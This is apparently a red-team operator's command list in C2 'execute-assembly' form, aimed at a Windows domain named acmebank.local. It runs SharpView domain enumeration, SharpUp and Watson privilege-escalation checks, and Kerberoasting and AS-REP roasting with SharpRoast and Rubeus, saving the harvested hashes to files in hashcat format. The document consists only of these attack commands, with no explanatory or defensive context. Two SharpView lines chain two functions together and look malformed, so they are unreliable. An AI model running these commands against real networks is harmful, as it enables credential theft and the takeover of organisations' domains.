```
execute-assembly C:/Users/Public/SharpView.exe Get-DomainController -Domain acmebank.local
execute-assembly C:/Users/Public/SharpView.exe Get-DomainController Get-ObjectAcl 
execute-assembly C:/Users/Public/SharpView.exe Get-DomainController Get-DomainSubnet

execute-assembly C:/Users/Public/SharpUp.exe
execute-assembly C:/Users/Public/watson.exe

execute-assembly C:/Users/Public/SharpRoast.exe all

execute-assembly C:/Users/Public/Rubeus.exe kerberoast
execute-assembly C:/Users/Public/Rubeus.exe kerberoast /outfile:hashes.kerberoast 

execute-assembly C:/Users/Public/Rubeus.exe asreproast
execute-assembly C:/Users/Public/Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast
```
